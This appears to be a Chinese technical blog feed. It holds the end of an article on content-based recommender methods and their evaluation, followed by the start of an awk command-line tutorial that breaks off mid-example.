class="vlist" style="height:1.45em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathbb">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.03148em;">ik</span><span class="mord mathnormal">e</span><span class="mord">∣</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.02778em;">ser</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">u</span><span class="mord mathnormal">res</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.7em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathbb">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.03148em;">ik</span><span class="mord mathnormal">e</span><span class="mord">∣</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.02778em;">ser</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">u</span><span class="mord mathnormal">res</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.996em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>具有特定特征的用户喜欢该物品的概率与不喜欢该物品的概率之间的比值。定义我们的分类规则的条件概率的比值可以用贝叶斯公式来表示：</p><p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4-k2KU3jD5Coru-zVZVDbg@2x.png" alt=""></p><p>其中,</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="double-struck">P</mi><mrow><mi>i</mi><mi>t</mi><mi>e</mi><mi>m</mi></mrow></msub><mo stretchy="false">(</mo><mi>l</mi><mi>i</mi><mi>k</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathbb{P}_{item}(like)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbb">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.03148em;">ik</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></span></p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="double-struck">P</mi><mrow><mi>i</mi><mi>t</mi><mi>e</mi><mi>m</mi></mrow></msub><mo stretchy="false">(</mo><mi>d</mi><mi>i</mi><mi>s</mi><mi>l</mi><mi>i</mi><mi>k</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathbb{P}_{item}(dislike)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbb">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.03148em;">ik</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></span></p><p>是从数据中计算得到的先验，基于数据由高斯分布的假设，可从数据中计算得到的概率：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="double-struck">P</mi><mrow><mi>i</mi><mi>t</mi><mi>e</mi><mi>m</mi></mrow></msub><mo stretchy="false">(</mo><mo>⋅</mo><mi mathvariant="normal">∣</mi><mi>l</mi><mi>i</mi><mi>k</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathbb{P}_{item}(\cdot|like)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbb">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">⋅</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.03148em;">ik</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></span></p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="double-struck">P</mi><mrow><mi>i</mi><mi>t</mi><mi>e</mi><mi>m</mi></mrow></msub><mo stretchy="false">(</mo><mo>⋅</mo><mi mathvariant="normal">∣</mi><mi>d</mi><mi>i</mi><mi>s</mi><mi>l</mi><mi>i</mi><mi>k</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathbb{P}_{item}(\cdot|dislike)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbb">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">⋅</span><span class="mord">∣</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.03148em;">ik</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></span></p><p>对于这两个似然分布的协方差矩阵（无假设、矩阵相等、矩阵相等、特征独立）可以做各种假设，从而得到各种广为人知的模型（二次判别分析、线性判别分析、朴素贝叶斯分类器）。我们可以再次强调，在这里，可能性参数只能根据与所考虑物品相关的数据（相互作用）来估计。</p><p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xOm9KhtWr_NrybG8WS93ZQ@2x.png" alt="Illustration of the item-centred content based Bayesian classifier."></p><h3 id="用户为中心的线性回归">用户为中心的线性回归</h3><p>现在让我们考虑以用户为中心的回归：对于每个用户，我们希望训练一个简单的线性回归，将物品特征作为输入，并输出该物品的评分。我们仍然将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>表示为用户——物品交互矩阵，将用户行向量堆叠成矩阵<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>，表示要学习的用户系数，将物品向量堆叠成矩阵<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，表示给定的物品特征。然后，对于给定的用户i，我们通过解决以下优化问题来学习<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">X_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>中的系数：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>X</mi><mi>i</mi></msub><mo>=</mo><mi>arg</mi><mo>⁡</mo><mi>min</mi><mo>⁡</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><munder><mo>∑</mo><mrow><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>E</mi></mrow></munder><mrow><mo stretchy="false">[</mo><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>Y</mi><mi>j</mi></msub><msup><mo stretchy="false">)</mo><mi>T</mi></msup><mo>−</mo><msub><mi>M</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><msup><mo stretchy="false">]</mo><mn>2</mn></msup></mrow><mo>+</mo><mfrac><mi>λ</mi><mn>2</mn></mfrac><munder><mo>∑</mo><mi>k</mi></munder><mrow><mo stretchy="false">(</mo><msub><mi>X</mi><mrow><mi>i</mi><mi>k</mi></mrow></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></mrow><annotation encoding="application/x-tex">X_i = \arg\min \frac{1}{2}\sum_{(i,j)\in E}{[(X_i)(Y_j)^T-M_{ij}]^2}+\frac{\lambda}{2}\sum_{k}{(X_{ik})^2} </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.8374em;vertical-align:-1.516em;"></span><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">min</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.809em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mclose mtight">)</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">E</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.516em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen">[(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.6736em;vertical-align:-1.3021em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">λ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8479em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.3021em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">ik</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></span></p><p>其中i是固定的，因此，第一个求和只针对与用户i有关的物品。我们可以观察到，如果同时为所有用户解决这个问题，优化问题与我们在“交替矩阵分解”中解决的问题完全相同！这种观察强调了我们在第一节中提到的联系：基于模型的协同过滤(如矩阵分解)和基于内容的方法都假设用户——物品交互的潜在模型，但基于模型的协同过滤方法必须学习用户和物品的潜在表示，而基于内容的方法则基于人为定义的用户和/或物品的特征构建模型。</p><p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*trc0BNNW1J5_1CXyIJuR9w@2x.png" alt="Illustration of the user-centred content based regression."></p><p>最后，在基于内容的方法中，也存在一些潜在的交互模型。然而，这里的模型提供了定义用户和/或物品表示的内容：例如，用户由给定的特征表示，我们试着为每一件商品建立喜欢或不喜欢该商品的用户档案类型的模型。对于基于模型的协同过滤，本文假设了一个用户——物品交互模型。然而，该模型受到更多约束（因为给出了用户和/或物品的表示），因此，该方法倾向于具有最大的偏差但方差最小。</p><p><img src="https://miro.medium.com/max/720/1*rCK9VjrPgpHUvSNYw7qcuQ@2x.webp" alt=""></p><hr><h2 id="对推荐系统的评估方法">对推荐系统的评估方法</h2><p>对于任何机器学习算法，我们都需要能够评估我们的推荐系统的性能，以便决定哪种算法最适合我们的情况。推荐系统的评价方法主要分为两种：基于明确指标的评价和基于人的判断和满意度估计的评价。</p><h3 id="基于指标的评价">基于指标的评价</h3><p>如果我们的推荐系统是基于输出数值（如评分预测或匹配概率）的模型，那么我们可以使用误差测量度量（例如均方误差MSE）以非常经典的方式评估这些输出的质量。在这种情况下，模型只在可用交互的一部分上进行训练，并在其余的交互上进行测试。</p><p>如果我们的推荐系统是基于一个预测数值的模型，我们也可以用经典的阈值方法将这些值二值化，高于阈值的值为正，低于阈值的值为负，并以一种更“分类的方式”评估模型。实际上，由于用户——物品过去交互的数据集也是二进制的（或者说是通过阈值化变为二进制的），我们可以在不用于训练的交互测试数据集上评估模型二值化输出的准确性（以及精度和召回率）。</p><p>最后，如果我们现在考虑一个不基于数值的推荐系统，并且只返回一个推荐列表（例如基于KNN方法的用户——用户或物品——物品），我们仍然可以通过估计真正适合我们用户的推荐项目的比例来定义一个类似度量的精度。为了估计这个精度，我们不能考虑用户没有交互过的推荐项目，我们应该只考虑来自测试数据集中有用户反馈的项目。</p><h3 id="基于人的判断的评价">基于人的判断的评价</h3><p>在设计推荐系统时，我们不仅希望获得能够产生我们非常确定的推荐的模型，而且还希望获得一些其他良好的特性，如推荐的多样性和可解释性。</p><p>正如在协同过滤算法中提到的，我们希望避免用户被困在信息茧房中。“惊喜发现”的概念经常被用来表达一个模型是否有这样一个限制区域的倾向，即建议的多样性。其实，我们可以通过计算推荐物品之间的距离来估算这种偶然性，它不应该太低，因为这会产生信息茧房，但也不应该太高，因为这意味着我们在推荐时没有充分考虑用户的兴趣。因此，为了在建议的选择中带来多样性，我们希望推荐既非常适合我们的用户，又彼此不太相似的项目。例如，与其推荐用户“Start Wars 1、2和3”，不如推荐“Star Wars 1”、“Start trek into darkness”和“Indiana Jones and the raiders of the lost ark”：之后这两件商品可能会被我们的系统认为不太可能引起用户的兴趣，但推荐三件看起来太相似的商品并不是一个好的选择。</p><p>可解释性是推荐算法成功的另一个关键。事实上，事实证明，如果用户不理解为什么他们被推荐为特定的项目，他们往往会对推荐系统失去信心。所以，如果我们设计了一个可以清楚解释的模型，我们可以在推荐的时候添加一个小句子，说明一个商品被推荐的原因（“喜欢这个商品的人也喜欢这个”，“你喜欢这个商品，你可能会对这个感兴趣”）。</p><p>最后，除了多样性和可解释性本质上难以评估这一事实之外，我们注意到，评估不属于测试数据集的推荐的质量也相当困难：在实际向用户推荐一个新的推荐之前，如何知道它是否相关？由于所有这些原因，在“真实情况”中测试模型有时很有诱惑力。由于推荐系统的目标是生成一个动作(看电影、购买产品、阅读文章等)，我们确实可以评估它生成预期动作的能力。例如，系统可以按照A/B测试方法投入生产，也可以只在用户样本上进行测试。然而，这样的过程需要对模型有一定程度的信心。</p>]]></content>
    
    
    <categories>
      
      <category>Miscellaneous</category>
      
    </categories>
    
    
    <tags>
      
      <tag>recommender systems</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>awk 从入门到入土</title>
    <link href="/2022/07/19/2022-7-19-awk/"/>
    <url>/2022/07/19/2022-7-19-awk/</url>
    
    <content type="html"><![CDATA[<h1>awk 从入门到入土</h1><h2 id="何为-awk-？">何为 awk ？</h2><p><a href="https://www.gnu.org/software/gawk/manual/gawk.html">awk</a> 是一种用于文本处理、数据提取分析和报告常用的 linux 工具（命令）。与 sed 和 grep 一样，在日常编程和使用 linux 操作系统中，它是提升效率的法宝。</p><p>awk 处理的数据可以来自标准输入(stdin)、文件，或其它命令的输出。它支持用户自定义函数和动态正则表达式等功能，是linux/unix下的一个强大编程工具。它在命令行中使用，但更多是作为脚本来使用。awk 内有完备的“语言”，可以写出数组、函数、分支等复杂结构，且语法与 C 语言的相通之处。相比 sed grep 命令，灵活性是 awk 最大的优势，但其包含了复杂语法、正则表达式、内置变量（函数）也让很多人望而生畏。</p><p>另外，该工具之所以叫 AWK 是因为其取了三位创始人 Alfred Aho，Peter Weinberger, 和 Brian Kernighan 的 Family Name 的首字符。</p><h2 id="awk-到底能做什么？">awk 到底能做什么？</h2><p>awk 功能强大，特点繁杂，若开篇介绍用法会让该博文显得杂乱无章，让人毫无阅读兴趣。我尝试抛开复杂的语法和命令格式，先利用几个例子让读者了解一下 awk 的工作方式和功能是怎样的。相信你一定会被 awk 强大的信息提取能力所折服。当你熟练掌握 awk 后，就再也不会烦恼于数据的格式化输出和信息提取了😄。</p><h3 id="awk-对文件操作">awk 对文件操作</h3><ol><li><p><strong>逐行扫描文件</strong>。awk 的基本功能是搜索/匹配文件中包含特定<strong>模式</strong>的文本。当其中的内容匹配到了该模式时，awk 会在上执行指定的<strong>操作</strong>。awk 基本以行为处理单元，以这种方式一行一行地处理文本，直到遇到文件的末尾。</p> <figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">例1：打印文件的每行的第一列(域)<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> filename</span><br><br>例2：打印文件的每一行<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">awk <span class="hljs-string">&#x27;&#123;print $0&#125;&#x27;</span> filename</span><br></code></pre></td></tr></table></figure><p>print 是 awk 中最常用的操作，可打印出后面的字符，若有多个变量，用’,'连接。虽然脚本中<strong>只写了对一行的操作</strong>，但由于 awk 会以逐行的方式遍历整个文本，因此最终该命令会打印出每一行的结果。</p></li><li><p><strong>将每一行输入拆分为字段</strong>。awk 逐行扫描文件后，再对行中的列（域）做匹配。可以使用 $n 来表示第n列的字符，而 $0 表示整一行。内置变量 $NF 表示字段总数，因此 $NF 可表示倒数第一列。对列的分割默认是空格，但也可以通过改变内置变量 FS 来改变分割符号。</p> <figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis">例<span class="hljs-number">3</span>：从 /etc/passwd 文件中，按照<span class="hljs-string">&quot;:&quot;</span>分割打印出第<span class="hljs-number">2</span>列和倒数第一列、倒数第二列：<br>&gt; awk -F<span class="hljs-string">&quot;:&quot;</span> <span class="hljs-string">&#x27;&#123;print <span class="hljs-variable">$2</span>,<span class="hljs-variable">$(NF)</span>,<span class="hljs-variable">$(NF-1)</span>&#125;&#x27;</span> /etc/passwd （或）<br>&gt; awk <span class="hljs-string">&#x27;BEGIN&#123;FS=&quot;:&quot;&#125; &#123;print <span class="hljs-variable">$2</span>,<span class="hljs-variable">$(NF)</span>,<span class="hljs-variable">$(NF-1)</span>&#125;&#x27;</span> /etc/passwd<br></code></pre></td></tr></table></figure><p>BEGIN 块表示该脚本块需要在 awk 逐行遍历文件前就执行，且只执行一次，通常用于初始化内部变量或计算数据。与之相反，END 块只能在awk 逐行遍历文件后执行，且执行一次</p></li><li><p><strong>比较输入行/字段与模式</strong>。比较或匹配模式通常要涉及到正则表达式的相关知识，关于正则表达式可参考<a href="https://www.runoob.com/regexp/regexp-syntax.html">菜鸟教程</a>。但 awk 还提供了类似 C 语言中的判断指令，从而做出更复杂的条件判断和算术逻辑。甚至可以完全抛弃文件，单独做一些复杂计算。</p> <figure class="highlight wasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs wasm">例<span class="hljs-number">4</span>：找到 test.txt 中最后一列大于 <span class="hljs-number">5000</span> 的列并打印出来：<br>&gt; awk &#x27;&#123;<span class="hljs-keyword">if</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">$NF</span> 